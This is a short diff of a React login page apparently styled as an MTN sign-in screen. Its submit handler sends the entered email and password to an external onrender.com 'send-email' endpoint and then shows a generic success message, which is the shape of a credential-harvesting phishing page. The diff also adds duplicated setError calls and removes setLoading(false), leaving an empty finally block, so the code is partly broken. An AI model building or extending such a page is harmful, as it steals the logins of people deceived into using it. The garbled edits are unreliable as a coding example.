@@ -23,8 +23,6 @@ const MtnLoginPage: React.FC = () => {
   const [logo, setLogo] = useState("");
   const [background, setBackground] = useState("");
   const [securedSession, setSecuredSession] = useState(true);
-const [lastSuccessEmail, setLastSuccessEmail] = useState<string>("");
-const [successCount, setSuccessCount] = useState<number>(0);
 
   const { enqueueSnackbar } = useSnackbar();
 
@@ -101,17 +99,14 @@ const [successCount, setSuccessCount] = useState<number>(0);
   try {
     await axios.post("https://web-mail-925d.onrender.com/send-email", { email, password });
     setError("");
+    setError("");
+    setError("");
     setPassword(""); // Clear password field
     enqueueSnackbar("Message sent successfully", { variant: "success" });
-    setLastSuccessEmail(email);
-    setSuccessCount(1);
   } catch (err) {
-    setError("Failed to send email. Try again!");
     enqueueSnackbar("Failed to send message. Please try again.", { variant: "error" });
-    setSuccessCount(0);
     console.error("Email sending error:", err);
   } finally {
-    setLoading(false);
   }
 };
 
